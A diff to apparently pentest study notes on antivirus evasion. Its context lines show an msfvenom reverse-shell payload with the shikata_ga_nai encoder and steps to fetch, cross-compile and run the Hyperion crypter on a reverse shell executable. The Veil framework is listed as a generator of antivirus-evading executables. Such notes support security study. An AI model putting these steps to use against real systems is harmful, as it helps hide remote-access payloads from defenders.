@@ -25,6 +25,7 @@ msfvenom --payload windows/shell_reverse_tcp --encoder x86/shikata_ga_nai --iter
 > results are not as good as we tought they'll be. but are improved.
 
 ## Packers and Crypters
+### Hyperion
 > We'll use `Hyperion` (cross compiled on kali for windows os)
 ```
 wget https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
@@ -39,8 +40,9 @@ i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe
 wine hyperion.exe reverse_shell_tcp_embedded.exe reverse_shell_tcp_embedded_crypted.exe
 ```
 
-## Veil Framework
+### Veil Framework
 > https://github.com/Veil-Framework/Veil
+> https://www.veil-framework.com/
 - Evasion => Generates Anti-Virus avoiding executables
 - Ordnance => Generates shellcode for supported payloads
 
